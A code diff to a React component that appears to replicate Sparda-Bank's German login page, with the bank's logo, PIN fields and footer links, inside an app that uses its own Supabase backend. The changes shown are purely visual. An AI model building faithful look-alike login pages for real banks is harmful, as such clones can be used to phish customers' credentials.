@@ -3,7 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Eye, EyeOff, ChevronRight, ChevronDown } from "lucide-react";
+import { Eye, EyeOff, ArrowRight, ChevronDown } from "lucide-react";
 import logoAsset from "@/assets/sparda-logo.avif.asset.json";
 import teaserAsset from "@/assets/sparda-teaser.avif.asset.json";
 
@@ -68,9 +68,27 @@ const SpardaBankDe = () => {
           <div className="max-w-[1200px] mx-auto px-6 py-10 grid grid-cols-1 lg:grid-cols-2 gap-8">
             <div className="flex flex-col gap-6">
               <section className="bg-white rounded-lg p-8" style={{ boxShadow: CARD_SHADOW }}>
-                <h1 style={{ color: BLUE, fontSize: 32, fontWeight: 700, marginBottom: 24, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
+                <h1 style={{ color: BLUE, fontSize: 32, fontWeight: 700, marginBottom: 20, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                   Anmelden
                 </h1>
+
+                <div style={{ borderBottom: "1px solid #e4e8ec", marginBottom: 24 }}>
+                  <button
+                    type="button"
+                    style={{
+                      padding: "10px 4px",
+                      marginBottom: -1,
+                      borderBottom: `3px solid ${BLUE}`,
+                      color: BLUE,
+                      fontWeight: 700,
+                      fontSize: 15,
+                      fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif",
+                    }}
+                  >
+                    Mit Zugangsdaten anmelden
+                  </button>
+                </div>
+
 
                 {/* Fields */}
                 <div className="space-y-5">
@@ -108,10 +126,16 @@ const SpardaBankDe = () => {
                   </div>
 
                   <div className="flex justify-end">
-                    <a href="#" onClick={(e) => e.preventDefault()} style={{ color: BLUE, fontSize: 14, fontWeight: 600 }}>
+                    <button
+                      type="button"
+                      style={{ color: BLUE, fontSize: 14, fontWeight: 600, padding: "6px 10px", borderRadius: 6, background: "transparent", transition: "background-color 150ms ease" }}
+                      onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#f2f7fb"; }}
+                      onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = "transparent"; }}
+                    >
                       PIN vergessen?
-                    </a>
+                    </button>
                   </div>
+
                 </div>
 
                 <hr className="my-6" style={{ borderColor: "#e4e8ec" }} />
@@ -161,9 +185,14 @@ const SpardaBankDe = () => {
             </div>
 
             <aside>
-              <div className="bg-white rounded-lg overflow-hidden" style={{ boxShadow: CARD_SHADOW }}>
+              <a
+                href="#"
+                onClick={(e) => e.preventDefault()}
+                className="sp-card group block bg-white rounded-lg overflow-hidden"
+                style={{ boxShadow: CARD_SHADOW, transition: "box-shadow 200ms ease" }}
+              >
                 <img src={teaserAsset.url} alt="Geldanlage" className="w-full h-[420px] object-cover" />
-                <div className="p-6">
+                <div className="sp-card-body p-6" style={{ transition: "background-color 200ms ease" }}>
                   <h2 style={{ color: TEXT, fontSize: 22, fontWeight: 700, marginBottom: 10, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                     Finden Sie die Geldanlage, die zu Ihnen passt!
                   </h2>
@@ -171,13 +200,14 @@ const SpardaBankDe = () => {
                     Ob Vermögensaufbau oder finanzielle Vorsorge – wählen Sie die Geldanlage, die Ihren Zielen entspricht.
                   </p>
                   <div className="flex justify-end mt-4">
-                    <a href="#" onClick={(e) => e.preventDefault()} style={{ color: BLUE }} aria-label="Weiter">
-                      <ChevronRight size={28} />
-                    </a>
+                    <span style={{ color: BLUE }} aria-label="Weiter">
+                      <ArrowRight size={28} />
+                    </span>
                   </div>
                 </div>
-              </div>
+              </a>
             </aside>
+
           </div>
         </main>
 
@@ -186,7 +216,7 @@ const SpardaBankDe = () => {
             <nav className="flex flex-wrap items-center justify-center gap-x-2 gap-y-2 text-sm">
               {["Impressum", "Sicherheitshinweise", "Nutzungsbedingungen", "Datenschutz", "Pflichtinformationen", "AGB"].map((l, i, arr) => (
                 <span key={l} className="flex items-center gap-2">
-                  <a href="#" onClick={(e) => e.preventDefault()} className="text-white hover:underline font-semibold">{l}</a>
+                  <a href="#" onClick={(e) => e.preventDefault()} className="text-white font-semibold">{l}</a>
                   {i < arr.length - 1 && <span className="opacity-60">·</span>}
                 </span>
               ))}
